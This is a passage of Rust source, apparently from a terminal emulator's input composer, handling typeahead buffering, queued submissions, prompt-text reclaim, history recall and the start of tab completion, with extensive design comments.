    /// the queue's tail (`pump_pending` drains at the shell's real prompt-
    /// render pace). The composer NEVER leaves Compose for the gesture — the
    /// field cascade was the first spacer submit yielding to Raw, after
    /// which every remaining key-repeat fell straight through to the grid
    /// as raw Enter spam.
    pub(crate) fn push_spacer(&mut self) {
        let tail_spacers = self
            .pending
            .iter()
            .rev()
            .take_while(|p| p.is_empty())
            .count();
        if tail_spacers < SPACER_QUEUE_CAP && self.pending_has_room() {
            self.pending.push_back(String::new());
        }
    }

    /// Enter during the typeahead window: the draft becomes a queued blind
    /// submission, dispatched on its own prompt cycle by `pump_pending`
    /// (one command per cycle — the fusion-proof rule).
    fn queue_draft(&mut self) {
        let text = std::mem::take(&mut self.draft);
        self.recall = None;
        self.pending.push_back(text.trim_end().to_string());
    }

    /// Fold queued blind submissions back into the visible draft (oldest
    /// first, one line each; spacers drop — they were cosmetic newlines).
    /// Used wherever buffered bytes must NOT fire (deliberate yield, reset,
    /// death, a stale window): nothing typed is ever silently lost, and
    /// nothing executes without the user seeing it.
    fn fold_pending_into_draft(&mut self) {
        self.post_submit = None;
        if self.pending.is_empty() {
            return;
        }
        let mut lines: Vec<String> = self.pending.drain(..).filter(|p| !p.is_empty()).collect();
        if !self.draft.trim().is_empty() {
            lines.push(std::mem::take(&mut self.draft));
        }
        self.draft = lines.join("\n");
        self.caret_to_end = true;
    }

    /// Flush the typeahead buffer to the PTY IN ORDER — queued submissions
    /// each followed by their Enter (`\r`), then the live draft verbatim
    /// (no trailing Enter: the user hasn't pressed it). Plain keystroke
    /// bytes (UTF-8 passthrough, `\r` for Enter — exactly what typing raw
    /// would have produced), queued on the `pending_clear` outbox which the
    /// app ships right after `tick`, i.e. within the SAME frame. Yields the
    /// editor to `reason`.
    fn flush_to_pty(&mut self, reason: RawReason, now: Instant) {
        let mut bytes = Vec::new();
        for item in self.pending.drain(..) {
            bytes.extend_from_slice(keystroke_bytes(&item).as_bytes());
            bytes.push(b'\r');
        }
        let draft = std::mem::take(&mut self.draft);
        bytes.extend_from_slice(keystroke_bytes(&draft).as_bytes());
        if !bytes.is_empty() {
            match &mut self.pending_clear {
                Some(v) => v.extend_from_slice(&bytes),
                None => self.pending_clear = Some(bytes),
            }
        }
        if trace_enabled() {
            log::info!("[composer] typeahead buffer flushed to PTY ({reason:?})");
        }
        self.post_submit = None;
        self.recall = None;
        self.mode = ComposerMode::Raw(reason);
        self.want_focus = false;
        self.has_focus = false;
        self.last_activity = Some(now);
    }

    /// Resolve a live post-submit window (called from `tick`, every frame,
    /// BEFORE the mode belts — rule order is load-bearing):
    /// (s) a stale window (tick paused — deselect/occlusion) folds the
    ///     buffer into the draft: never fire bytes into a moment that has
    ///     passed;
    /// (c) a FRESH `pre` (the common fast-typing case): the shell is back at
    ///     a prompt — close the window, keep the draft, stay Compose; the
    ///     buffered draft is already in place and `pump_pending` dispatches
    ///     the next queued submission at the clean re-latch;
    /// (a) alt-screen or MOUSE_MODE flipped on: the submitted command is a
    ///     full-screen/interactive app and the buffered keys belong to IT —
    ///     flush in order within this same frame and yield raw;
    /// (b) no fresh pre within POST_SUBMIT_FLUSH: long-running command —
    ///     flush as shell type-ahead and yield Raw(Busy). Exception: an
    ///     all-spacer buffer just abandons (never blind-fire bare `\r` at a
    ///     shell that stopped prompting — the held-Enter contract).
    fn resolve_post_submit(&mut self, backend: &TermBackend, now: Instant) {
        let Some(w) = self.post_submit else { return };
        let pre_now = backend
            .block_feed
            .as_ref()
            .map(|f| f.pre_seen)
            .unwrap_or(0);
        let age = now.duration_since(w.since);
        let mode = backend.mode();
        let alt = mode.contains(TermMode::ALT_SCREEN);
        let mouse = mode.intersects(TermMode::MOUSE_MODE);
        if age >= WINDOW_STALE {
            self.fold_pending_into_draft();
        } else if pre_now > w.pre0 {
            self.post_submit = None;
        } else if alt || mouse {
            self.flush_to_pty(
                if alt {
                    RawReason::AltScreen
                } else {
                    RawReason::Busy
                },
                now,
            );
        } else if age >= POST_SUBMIT_FLUSH {
            if self.pending.is_empty() && self.draft.trim().is_empty() {
                // Nothing buffered: the command is simply long-running —
                // yield to Raw(Busy) with no bytes. Typing from here on is
                // native shell type-ahead through the grid, exactly the
                // pre-typeahead behavior for a busy shell.
                self.post_submit = None;
                self.mode = ComposerMode::Raw(RawReason::Busy);
                self.want_focus = false;
                self.has_focus = false;
                self.last_activity = Some(now);
            } else if self.pending.iter().all(|p| p.is_empty())
                && self.draft.trim().is_empty()
            {
                // Held-Enter contract: an all-spacer buffer is abandoned,
                // never blind-fired. Compose stays armed at the (still
                // latched) prompt; the demotion clock handles a shell that
                // truly stopped prompting.
                if trace_enabled() {
                    log::info!(
                        "[composer] spacer queue abandoned: no fresh prompt within {POST_SUBMIT_FLUSH:?} ({} pending)",
                        self.pending.len()
                    );
                }
                self.pending.clear();
                self.post_submit = None;
            } else {
                self.flush_to_pty(RawReason::Busy, now);
            }
        }
    }

    /// Dispatch at most ONE queued blind submission per call, paced by the
    /// shell: only with no window in flight, no live SubmitHold, and the
    /// fresh prompt provably clean (latched + cursor at the captured prompt
    /// end) — exactly the state a hand-typed submit dispatches from. Returns
    /// the bytes to ship and whether this was the spacer gesture (the caller
    /// marks the spacer cover — the existing per-frame plumbing).
    pub(crate) fn pump_pending(
        &mut self,
        backend: &TermBackend,
        cover_line: Option<i32>,
        cwd: Option<&str>,
        now: Instant,
    ) -> Option<(Vec<u8>, bool)> {
        if self.mode != ComposerMode::Compose
            || self.post_submit.is_some()
            || self.submit_hold.is_some()
            || self.pending.is_empty()
        {
            return None;
        }
        if self.at_prompt_since.is_none() || !backend.cursor_at_prompt_end() {
            return None;
        }
        let text = self.pending.pop_front()?;
        Some(self.dispatch_submission(backend, cover_line, cwd, &text, now))
    }

    /// Drain the pending history-cover conversion (the app applies it to the
    /// backend, which owns the covers). Called once per frame after `tick`.
    pub fn take_pending_history_cover(
        &mut self,
    ) -> Option<(i32, usize, Option<String>, String)> {
        self.pending_history_cover.take()
    }

    /// The line the SubmitHold ghost should cover this frame, if the handoff
    /// is still valid (not timed out, pin maintainable): the submit-time row
    /// shifted by the history growth since (`hold_row`). Read-only —
    /// release/clearing happens in `tick` (grid-observed `echo_landed` + the
    /// 250ms cap).
    pub fn hold_line(&self, backend: &TermBackend, now: Instant) -> Option<i32> {
        self.submit_hold
            .as_ref()
            .filter(|h| hold_active(h, backend, now))
            .and_then(|h| hold_row(h, backend))
    }

    /// Raw bytes are about to be sent to this terminal's PTY from the grid
    /// (keys, grid paste, wheel-to-arrows, mouse reports — ALL raw bytes
    /// uniformly). Uses the episode when at a prompt; dismisses an armed
    /// composer (D7 — the last input target the user chose is authoritative).
    /// Keys typed into a TUI (`at_prompt` false) do NOT use the episode.
    pub fn on_raw_input(&mut self, now: Instant) {
        if self.at_prompt_since.is_some() {
            self.episode_used = true;
            if trace_enabled() {
                let ms = self
                    .at_prompt_since
                    .map(|t| now.duration_since(t).as_millis())
                    .unwrap_or(0);
                log::info!("[composer] raw key → PTY at a prompt (+{ms}ms since latch)");
            }
        }
        if self.mode == ComposerMode::Compose {
            // The user chose the grid: queued blind submissions fold into
            // the draft (visible, nothing fires behind their back).
            self.fold_pending_into_draft();
            self.mode = ComposerMode::Raw(RawReason::UserRaw);
            self.want_focus = false;
        }
    }

    /// Drain composer-authored PTY bytes queued during `tick` (the typeahead
    /// buffer flush), sent by the app right after it — the sanctioned send
    /// path.
    pub fn take_pending_clear(&mut self) -> Option<Vec<u8>> {
        self.pending_clear.take()
    }

    /// Drain a Cmd-family submission for the app to ship as
    /// `C2D::SubmitCommand{write:true}` (P6b §5.2). Same frame as dispatch.
    pub fn take_submit_cmd(&mut self) -> Option<String> {
        self.pending_submit_cmd.take()
    }

    /// The user yielded an armed composer to the grid (grid click, Esc, the
    /// ⌨ toggle): Raw(UserRaw) for the rest of this prompt episode — without
    /// consuming the episode the gate would auto-re-arm on the very next
    /// frame and fight the user for focus (D7).
    pub fn blur_to_grid(&mut self) {
        if self.mode == ComposerMode::Compose {
            // Deliberate yield mid-buffer: nothing fires — queued blind
            // submissions fold into the draft where the user can see them.
            self.fold_pending_into_draft();
            self.mode = ComposerMode::Raw(RawReason::UserRaw);
            if self.at_prompt_since.is_some() {
                self.episode_used = true;
            }
        }
        self.want_focus = false;
        self.has_focus = false;
    }

    /// Explicit user activation (strip click). Returns bytes to send FIRST:
    /// the clear chord when the prompt provably (or possibly — cold attach)
    /// holds stray text, else empty (D4).
    ///
    /// V2 (P4 §2.4): before clearing a dirty prompt, exactly-recoverable
    /// typed text is PULLED into the draft — the strip label promised
    /// "keeps it" / "clears it" before this click, so the outcome is never a
    /// surprise. Refusal variants (multi-line / mid-line / unavailable) fall
    /// back to v1's discard; the chord ships either way. Keystrokes in
    /// flight between the grid read and the chord landing die with the
    /// CancelLine — click-bounded, and the reclaimed draft is a superset of
    /// what the user had at click time.
    pub fn activate(&mut self, backend: &TermBackend) -> Vec<u8> {
        let mut out = Vec::new();
        if !backend.cursor_at_prompt_end() {
            // v0.1.1 guards (the field `^C`-spam loop: a systematically-wrong
            // 133;B capture made every activation reclaim the PROMPT STRING
            // itself and ship a chord, whose fresh prompt was captured wrong
            // again — six `^C` rows in the screenshot):
            //   - a capture at column 0 can only describe the prompt text,
            //     never typed input (prompts render from the row start) —
            //     neither reclaim nor chord; arm and let the DEMOTE path
            //     yield honestly if the capture stays broken;
            //   - at most one chord per prompt epoch (`chord_pre`): repeat
            //     activations without an intervening fresh `pre` arm without
            //     the chord and without re-reclaiming (the first click
            //     already pulled the text).
            let col0_capture = backend
                .block_feed
                .as_ref()
                .and_then(|f| f.prompt_end)
                .is_some_and(|(_, col)| col == 0);
            let pre = backend
                .block_feed
                .as_ref()
                .map(|f| f.pre_seen)
                .unwrap_or(0);
            let chord_fresh = self.chord_pre != Some(pre);
            if !col0_capture && chord_fresh {
                if let Reclaim::Text(t) = backend.reclaim_text() {
                    if !t.is_empty() {
                        self.push_reclaimed(&t);
                    }
                }
                self.chord_pre = Some(pre);
                out = line_clear_chord(backend, self.is_cmd);
            }
            if self.at_prompt_since.is_some() {
                self.episode_used = true;
            }
        }
        self.mode = ComposerMode::Compose;
        self.want_focus = true;
        out
    }

    /// Merge reclaimed prompt text into the draft. Never destroys either
    /// side: an existing draft keeps its lines and the reclaimed fragment is
    /// appended on its own line — visually distinct, trivially deletable,
    /// and on PS 5.1 two lines = two visible submissions, never a silent
    /// fusion into one wrong command (open question 4).
    fn push_reclaimed(&mut self, t: &str) {
        if self.draft.is_empty() {
            self.draft = t.to_string();
        } else {
            self.draft.push('\n');
            self.draft.push_str(t);
        }
        self.caret_to_end = true;
        self.recall = None; // an edit-equivalent: any recall walk resets
    }

    /// QOL §4.5: text a pointer act delivered INTO the command being typed —
    /// a file drop's quoted paths, or menu/middle-click paste while armed.
    /// APPENDS to the draft (a space separator when needed), caret to the
    /// end. Deliberately NOT `insert_history` (that stashes/replaces — a
    /// drop composes into the current command); works identically while
    /// post-submit buffering (the draft is live). Pointer-never-disarms:
    /// no episode consumed, no mode change.
    pub fn insert_dropped_text(&mut self, s: &str) {
        // Bug E: menu-Paste / middle-click deliver clipboard text verbatim —
        // normalize exactly like Ctrl+V so a trailing CRLF can't pop the
        // multi-line editor. Drop-built inserts are already newline-free.
        let s = normalize_paste_text(s);
        if !self.draft.is_empty() && !self.draft.ends_with(char::is_whitespace) {
            self.draft.push(' ');
        }
        self.draft.push_str(&s);
        self.caret_to_end = true;
        self.recall = None; // an edit-equivalent: any recall walk resets
    }

    /// Cross-session history insert (P4 §3.4): replace the visible draft
    /// with `cmd`, stashing any displaced draft in the recall slot so
    /// ArrowDown-past-newest restores it (the P3 recall gesture — one
    /// mechanism for both). Any edit drops the stash (P3 rule, enforced at
    /// the UI via `changed()`).
    pub fn insert_history(&mut self, cmd: &str) {
        if !self.draft.is_empty() && self.draft != cmd {
            self.recall = Some((RecallSrc::History, self.draft.clone()));
        }
        self.draft = cmd.to_string();
        self.caret_to_end = true;
        self.want_focus = true;
    }

    /// The history popup's Run gate (D10): Run reuses the exact P3 submit
    /// path, so it is allowed only when the composer is armed (Compose, and
    /// the shell is submit-ready — a focused Compose can linger through a
    /// busy shell, where Enter is equally disabled) or provably armable this
    /// frame (gate == AutoArm). Never from ManualOnly: stray prompt text
    /// would prefix the command.
    pub fn history_run_allowed(
        &self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        now: Instant,
    ) -> bool {
        let inputs = self.gate_inputs(backend, recs, running, now);
        // The typeahead buffer holds Run too: one command per prompt cycle
        // (a Run mid-window would double-submit into one prompt).
        let submit_ready = inputs.running
            && !inputs.alt
            && !inputs.open_block
            && inputs.at_prompt
            && !self.buffering();
        (self.mode == ComposerMode::Compose && submit_ready)
            || gate(&inputs) == GateVerdict::AutoArm
    }

    /// Submit: returns the submission bytes, keeps the composer in Compose
    /// and opens the post-submit typeahead window in the same frame (D6) —
    /// no waiting on any hook. The user typing the instant after Enter lands
    /// in the DRAFT (the next command), never raw at the shell: the window
    /// resolves per `resolve_post_submit`. `cover_line` is the grid row the
    /// editor covered (Some when the prompt-row cover was live): when
    /// present, a SubmitHold keeps painting the just-submitted text there
    /// (and frozen in the lane while the draft is empty) until the shell
    /// echo is observed in the grid, so Enter causes no empty-row flash
    /// (Bug 3).
    ///
    /// An empty/whitespace draft sends a bare `\r` — the user's "more lines"
    /// spacing gesture (a real newline in shell history, honest across
    /// restarts). It creates no ghost hold; instead the app marks the current
    /// prompt row a blank SPACER cover so the row it leaves behind renders
    /// as whitespace rather than a stacked raw `PS …>` prompt. Returns the
    /// bytes and whether this was the spacer gesture.
    pub fn submit(
        &mut self,
        backend: &TermBackend,
        cover_line: Option<i32>,
        cwd: Option<&str>,
    ) -> (Vec<u8>, bool) {
        // Bug 1a (the "history rows inconsistently styled" root cause): an
        // Enter landing in the pre→133;B prompt-RENDER window passes
        // `can_submit` (at_prompt latched by the pre) but has no captured
        // prompt_end yet — so `cover_line_for` is None, NO SubmitHold gets
        // pinned, and the submission is permanently ineligible for the
        // history-cover conversion: that row showed raw `PS …> cmd` forever.
        // Fast typists hit this window (~15ms + a render frame, longer under
        // load) routinely. QUEUE instead: `pump_pending` dispatches the
        // moment 133;B lands and the cursor is provably at the fresh prompt
        // end — full cover/hold/conversion certainty, byte order preserved,
        // delay imperceptible (the shell was still painting its prompt).
        if backend.feed_live()
            && !self.draft.trim().is_empty()
            && self.at_prompt_since.is_some()
            && !backend.has_prompt_end()
            && self.pending_has_room()
        {
            if trace_enabled() {
                log::info!(
                    "[composer] submit in prompt-render window: queued (pending={})",
                    self.pending.len() + 1
                );
            }
            self.queue_draft();
            self.want_focus = true;
            self.mode = ComposerMode::Compose;
            return (Vec::new(), false);
        }
        let text = std::mem::take(&mut self.draft);
        self.recall = None;
        // Stay in the editor: a Run from a Raw-armable state arms it too.
        self.want_focus = true;
        self.dispatch_submission(backend, cover_line, cwd, &text, Instant::now())
    }

    /// The shared submission core (hand-typed Enter, Run ▸, history Run and
    /// the blind-queue pump all go through here — never a second encoder):
    /// encode the bytes, pin the SubmitHold ghost when a cover was live,
    /// spend the episode, and open the typeahead window. Mode is Compose on
    /// exit — input routing never yields raw for a submit.
    fn dispatch_submission(
        &mut self,
        backend: &TermBackend,
        cover_line: Option<i32>,
        cwd: Option<&str>,
        text: &str,
        now: Instant,
    ) -> (Vec<u8>, bool) {
        let spacer = text.trim().is_empty();
        // P6b §6 belt: a multi-line submission can never dispatch on a Cmd
        // terminal (the Enter gating refuses it upstream; a multi-line
        // history Run or a pasted-\n queued item lands here). Restore it to
        // the visible draft — nothing fires uninspected, nothing is lost.
        if self.is_cmd && !spacer && text.contains('\n') {
            self.draft = text.to_string();
            self.caret_to_end = true;
            return (Vec::new(), false);
        }
        // P6b §5.2 routing: Cmd-family commands ship as SubmitCommand (the
        // daemon writes the bytes AND records the synthetic block); spacers
        // stay honest bare-`\r` Input (a blank line is not a command — no
        // record). Every other family keeps the P3 byte path.
        let bytes = if self.is_cmd && !spacer {
            self.pending_submit_cmd = Some(text.trim().to_string());
            Vec::new()
        } else {
            submission_bytes(backend, text)
        };
        if !spacer {
            if let Some(line) = cover_line {
                self.submit_hold = Some(SubmitHold {
                    ghost: text.trim_end().to_string(),
                    line,
                    col: backend
                        .block_feed
                        .as_ref()
                        .and_then(|f| f.prompt_end)
                        .map(|(_, c)| c)
                        .unwrap_or(0),
                    cwd: cwd.map(str::to_owned),
                    since: now, // the dispatch's clock — not a second now()
                                // (drift-prone under simulated-time tests)
                    history: backend.history_size(),
                    grid: (backend.size.cols, backend.size.rows),
                });
            }
        }
        self.episode_used = true;
        self.mode = ComposerMode::Compose;
        self.last_activity = Some(now);
        self.post_submit = Some(SubmitWindow {
            pre0: backend
                .block_feed
                .as_ref()
                .map(|f| f.pre_seen)
                .unwrap_or(0),
            since: now,
        });
        (bytes, spacer)
    }

    /// Compose the gate inputs from the store + backend + own latches.
    fn gate_inputs(
        &self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        now: Instant,
    ) -> GateInputs {
        let mode = backend.mode();
        GateInputs {
            hooked: true, // a ComposerState exists only for epoch > 0
            running,
            alt: mode.contains(TermMode::ALT_SCREEN),
            mouse: mode.intersects(TermMode::MOUSE_MODE),
            // F7: feed-time truth beats the daemon Blocks round-trip. A
            // scanned `pre` IS the daemon's own close signal for the open
            // block (launch()/on_block close dangling records on it), so a
            // live at_prompt latch overrules a not-yet-closed rec — the gate
            // used to sit Blocked(Busy) for an extra round-trip per submit
            // (re-arm lag + a strip label flip).
            open_block: recs.iter().any(|r| r.end_off.is_none())
                && self.at_prompt_since.is_none(),
            at_prompt: self.at_prompt_since.is_some(),
            settled: self
                .at_prompt_since
                .is_some_and(|t| now.duration_since(t) >= SETTLE),
            cursor_clean: backend.cursor_at_prompt_end(),
            episode_used: self.episode_used,
            asleep: self.asleep,
        }
    }

    /// Per-frame signal pump for the SELECTED terminal (cheap: a gate eval).
    /// Applies the §2.4 transitions. `grid_focused` gates the auto-arm focus
    /// steal (§13.1: don't take focus the user didn't have on the grid).
    /// Returns the wakeup needed for a pending settle window, if any.
    pub fn tick(
        &mut self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        grid_focused: bool,
        now: Instant,
    ) -> Option<Instant> {
        let inputs = self.gate_inputs(backend, recs, running, now);
        // SubmitHold release (Bug 3, corrected): grid-observed only. Release
        // when the echo actually landed under the cover (echo_landed — text
        // in the row / cursor left the row / grid scrolled), at the 250ms
        // safety cap, or instantly when a full-screen app flipped on. The
        // exec-hook counter is NOT a release signal: ConPTY delivers it
        // ahead of the async-rendered echo text (P2 reorder), and releasing
        // on it dropped the cover onto a still-bare prompt row — the
        // confirmed submit-flicker root cause.
        //
        // On release, a grid-VERIFIED single-line command is converted to a
        // PERMANENT history cover (queued for the backend): from then on the
        // row paints `❯ cmd` instead of ever reverting to raw `PS …>`, so the
        // input surface never blinks through the default prompt between
        // commands (the flicker the user kept reporting). Only when the exact
        // command is still on the row (row_has_text_at) — otherwise the hold
        // just drops to the honest raw row. Wrapped/multi-line commands are
        // NOT converted (their wrap chain would need remapping across reflow;
        // dropping to raw is acceptable and honest).
        if let Some(h) = &self.submit_hold {
            // Bug 1b: the soft 250ms cap no longer force-releases — between
            // it and SUBMIT_HOLD_MAX the release belongs to echo_landed
            // alone, so a machine hitch delaying the echo can't cap-release
            // the hold unconverted (which left the row raw forever once the
            // late echo landed). See `hold_active`.
            let cap = !hold_active(h, backend, now);
            // The pin in current coordinates (submit row + history shift).
            // None ⇒ unmaintainable (resize / history shrink / off-ring):
            // release without converting — raw is honest, drift never is.
            let row = hold_row(h, backend);
            let landed = match row {
                None => true,
                Some(r) => echo_landed(backend, h, r),
            };
            if inputs.alt || cap || landed {
                let mut converted = false;
                if !inputs.alt {
                    if let Some(r) = row {
                        let first = h.ghost.lines().next().unwrap_or("");
                        if h.ghost.lines().count() == 1
                            && !first.is_empty()
                            && backend.row_has_text_at(r, h.col, first)
                        {
                            self.pending_history_cover =
                                Some((r, h.col, h.cwd.clone(), first.to_string()));
                            converted = true;
                        }
                    }
                }
                if trace_enabled() {
                    log::info!(
                        "[composer] hold release: row={row:?} landed={landed} cap={cap} alt={} multiline={} converted={converted} age={}ms",
                        inputs.alt,
                        h.ghost.lines().count() > 1,
                        now.duration_since(h.since).as_millis()
                    );
                }
                self.submit_hold = None;
                // The lane's frozen text just moved up into the grid (or
                // dropped honestly raw): open a quiet window so the strip
                // doesn't switch content for the release transient.
                self.last_activity = Some(now);
            }
        }
        if self.mode != ComposerMode::Compose {
            // The certainty clock is Compose-scoped: never let a stale
            // timestamp from a previous episode instant-demote a fresh arm.
            self.compose_broken_since = None;
        }
        match self.mode {
            ComposerMode::Compose => {
                // Post-submit typeahead window first — its flip rules OWN
                // the alt/mouse transition while it is live (the buffered
                // keys must flush to the app within the same frame as the
                // flip), and a fresh `pre` closes it with the draft kept.
                self.resolve_post_submit(backend, now);
                if self.mode != ComposerMode::Compose {
                    // Flushed + yielded (alt/mouse/busy threshold): done.
                } else if inputs.alt {
                    // Belt over the open-block signal: a full-screen app or
                    // a death always yields the editor (draft kept; queued
                    // blind submissions fold — no window was live, so this
                    // alt came from outside the submit path).
                    self.fold_pending_into_draft();
                    self.mode = ComposerMode::Raw(RawReason::AltScreen);
                    self.want_focus = false;
                    self.has_focus = false;
                } else if !running || inputs.asleep {
                    // SLEEP: a sleep landing mid-composition yields exactly
                    // like a death (draft kept, queue folded) but presents
                    // as Asleep — the lane's Wake ▸ is the way back.
                    self.fold_pending_into_draft();
                    self.mode = ComposerMode::Raw(if inputs.asleep {
                        RawReason::Asleep
                    } else {
                        RawReason::Dead
                    });
                    self.want_focus = false;
                    self.has_focus = false;
                } else {
                    // Certainty-loss demotion (restored-render fix): Compose
                    // whose current-prompt cover can no longer be justified
                    // (latch or cursor certainty broke — a resize repaint
                    // moved the real prompt off the seeded cell, an exec
                    // arrived outside the submit path, …) must not sit as an
                    // armed hint lane UNDER a raw prompt row with its own
                    // cursor. Sustained past DEMOTE ⇒ step down to Raw
                    // (draft kept; episode NOT consumed, so a genuine fresh
                    // latch re-arms; the ManualOnly path's Compose click +
                    // clear chord re-certifies through a real re-prompt).
                    // A live SubmitHold or post-submit window bridges its
                    // own span by design (each ≤ 300ms, self-resolving).
                    let healthy = self.submit_hold.is_some()
                        || self.post_submit.is_some()
                        || (inputs.at_prompt && inputs.cursor_clean);
                    if healthy {
                        self.compose_broken_since = None;
                    } else {
                        let since = *self.compose_broken_since.get_or_insert(now);
                        if now.duration_since(since) >= DEMOTE {
                            if trace_enabled() {
                                log::info!(
                                    "[composer] compose demoted: cover certainty lost for {:?} (at_prompt={} clean={})",
                                    now.duration_since(since),
                                    inputs.at_prompt,
                                    inputs.cursor_clean
                                );
                            }
                            // Demotion mid-buffer FLUSHES the queued blind
                            // submissions raw (honest — shell type-ahead
                            // runs them in order); queued spacers drop (a
                            // bare `\r` at an uncertain prompt is a blind
                            // fire, the held-Enter contract forbids it);
                            // the visible draft is kept, exactly as before.
                            if !self.pending.is_empty() {
                                let mut bytes = Vec::new();
                                for item in
                                    self.pending.drain(..).filter(|p| !p.is_empty())
                                {
                                    bytes.extend_from_slice(
                                        keystroke_bytes(&item).as_bytes(),
                                    );
                                    bytes.push(b'\r');
                                }
                                if !bytes.is_empty() {
                                    match &mut self.pending_clear {
                                        Some(v) => v.extend_from_slice(&bytes),
                                        None => self.pending_clear = Some(bytes),
                                    }
                                }
                            }
                            self.post_submit = None;
                            self.mode = ComposerMode::Raw(RawReason::NoPrompt);
                            self.want_focus = false;
                            self.has_focus = false;
                            self.compose_broken_since = None;
                            self.last_activity = Some(now);
                        }
                    }
                }
            }
            ComposerMode::Raw(_) => {
                let verdict = gate(&inputs);
                // Only the arm-relevant window (at a prompt) is logged, so a
                // diagnosing user sees exactly why a fresh prompt did or
                // didn't arm without drowning in idle Blocked(NoPrompt).
                if trace_enabled() && inputs.at_prompt {
                    log::info!(
                        "[composer] verdict={verdict:?} at_prompt={} settled={} clean={} episode={} open={} alt={}",
                        inputs.at_prompt,
                        inputs.settled,
                        inputs.cursor_clean,
                        inputs.episode_used,
                        inputs.open_block,
                        inputs.alt
                    );
                }
                match verdict {
                    GateVerdict::AutoArm => {
                        self.mode = ComposerMode::Compose;
                        if grid_focused {
                            self.want_focus = true;
                        }
                    }
                    // ManualOnly: keep the current reason — the strip shows
                    // the Compose affordance and its reclaim preview. The
                    // P4 race-window AUTO-reclaim (chord fired unprompted)
                    // is GONE: post-submit typing now buffers in the editor
                    // and never reaches the shell, so the only raw text at
                    // a prompt is genuinely user-typed — reclaiming it stays
                    // strictly click-gated (`activate`), with the outcome
                    // announced on the strip before the click. No more
                    // visible `PS …> f^C` churn in scrollback, ever.
                    GateVerdict::ManualOnly => {}
                    GateVerdict::Blocked(r) => self.mode = ComposerMode::Raw(r),
                }
            }
        }
        // Self-scheduled wakeups (§0.7): the settle window's trailing edge
        // (ZERO now, so inert) and the SubmitHold safety cap so the ghost is
        // torn down on time even if no output/exec arrives to release it.
        let mut wake: Option<Instant> = None;
        if let Some(t0) = self.at_prompt_since {
            let d = t0 + SETTLE;
            if now < d {
                wake = Some(d);
            }
        }
        if let Some(h) = &self.submit_hold {
            // The hard bound is the only time-driven release left (echo
            // releases arrive on output frames, which repaint by themselves).
            let d = h.since + SUBMIT_HOLD_MAX;
            if now < d {
                wake = Some(wake.map_or(d, |w| w.min(d)));
            }
        }
        // The typeahead window's flush threshold must fire on time even on
        // an output-quiet terminal (a hung command produces no repaints).
        if let Some(w) = &self.post_submit {
            let d = w.since + POST_SUBMIT_FLUSH;
            if now < d {
                wake = Some(wake.map_or(d, |x| x.min(d)));
            }
        }
        // A pending certainty-loss demotion must fire on time even on a
        // fully idle terminal (the broken restored session repaints rarely).
        if self.mode == ComposerMode::Compose {
            if let Some(t0) = self.compose_broken_since {
                let d = t0 + DEMOTE;
                if now < d {
                    wake = Some(wake.map_or(d, |w| w.min(d)));
                }
            }
        }
        wake
    }

    /// ArrowUp at the draft's first line: walk `recs` backwards, skipping
    /// blank cmds and entries equal to what is currently shown (consecutive
    /// dedupe). The first recall saves the draft. A History-sourced recall
    /// (a cross-session insert stashed the draft) starts the walk at the
    /// newest rec, carrying the stash along.
    pub fn recall_prev(&mut self, recs: &[BlockRec]) {
        let taken = self.recall.take();
        let was_history = matches!(taken, Some((RecallSrc::History, _)));
        let (start, saved, shown) = match taken {
            Some((RecallSrc::Recs(idx), saved)) => {
                let shown = recs
                    .get(idx)
                    .map(|r| r.cmd.clone())
                    .unwrap_or_else(|| saved.clone());
                (idx, saved, shown)
            }
            // The inserted command is what's shown; the stash rides along.
            Some((RecallSrc::History, saved)) => (recs.len(), saved, self.draft.clone()),
            None => {
                let saved = std::mem::take(&mut self.draft);
                let shown = saved.clone();
                (recs.len(), saved, shown)
            }
        };
        let mut found = None;
        let mut i = start;
        while i > 0 {
            i -= 1;
            let c = &recs[i].cmd;
            if c.trim().is_empty() || *c == shown {
                continue;
            }
            found = Some(i);
            break;
        }
        match found {
            Some(i) => {
                self.draft = recs[i].cmd.clone();
                self.recall = Some((RecallSrc::Recs(i), saved));
            }
            None if start < recs.len() => {
                // Already at the oldest distinct entry: stay there.
                self.draft = recs[start].cmd.clone();
                self.recall = Some((RecallSrc::Recs(start), saved));
            }
            None if was_history => {
                // Nothing distinct to walk to: keep the inserted draft and
                // the stash (ArrowDown can still restore it).
                self.recall = Some((RecallSrc::History, saved));
            }
            None => self.draft = saved, // nothing to recall at all
        }
    }

    /// ArrowDown at the draft's last line: walk forward; past the newest
    /// entry the saved draft is restored and the recall ends. A History
    /// stash is conceptually already past-newest, so one ArrowDown restores
    /// the displaced draft directly (spec §3.4 / D12).
    pub fn recall_next(&mut self, recs: &[BlockRec]) {
        let Some((src, saved)) = self.recall.take() else {
            return;
        };
        let idx = match src {
            RecallSrc::Recs(i) => i,
            RecallSrc::History => {
                self.draft = saved;
                self.caret_to_end = true;
                return;
            }
        };
        let shown = recs.get(idx).map(|r| r.cmd.clone()).unwrap_or_default();
        let mut found = None;
        let mut i = idx;
        while i + 1 < recs.len() {
            i += 1;
            let c = &recs[i].cmd;
            if c.trim().is_empty() || *c == shown {
                continue;
            }
            found = Some(i);
            break;
        }
        match found {
            Some(i) => {
                self.draft = recs[i].cmd.clone();
                self.recall = Some((RecallSrc::Recs(i), saved));
            }
            None => self.draft = saved, // past the newest: restore
        }
    }

    // ── Tab completion (#24) ─────────────────────────────────────────────

    /// A completion cycle is live AND still authoritative for the draft
    /// (any other edit since the last step commits the shown candidate).
    pub fn tab_active(&self) -> bool {
        self.tab.as_ref().is_some_and(|c| c.matches(&self.draft))
    }

    /// One frame's Tab traffic: `delta` = net presses (+forward/−reverse,
    /// several per frame under key repeat). Returns the caret (in CHARS) to
    /// place after the completed token when the draft changed; None = the
    /// consumed Tab did nothing (empty draft, ssh, no candidates — NEVER a
    /// literal tab either way). `cwd` = the terminal's tracked cwd
    /// (live_cwd else meta.cwd — posix verbatim for WSL); `caret_byte` =
    /// the editor caret as a byte offset into the draft.
    pub fn tab_press(&mut self, cwd: Option<&str>, caret_byte: usize, delta: i64) -> Option<usize> {
        if delta == 0 || matches!(self.fam, complete::Family::Ssh) {
            // ssh: no local view of the remote fs — silent no-op (spec).
            return None;
        }
        if self.draft.trim().is_empty() {
            return None; // Tab on an empty draft is a no-op, never spaces.
        }
        if let Some(cyc) = &mut self.tab {
            if cyc.matches(&self.draft) {
                let (draft, caret) = cyc.step(delta);
                self.draft = draft;
                self.recall = None; // completion forks recall like any edit
                return Some(caret);
            }
            self.tab = None; // edited since — that committed the candidate
        }
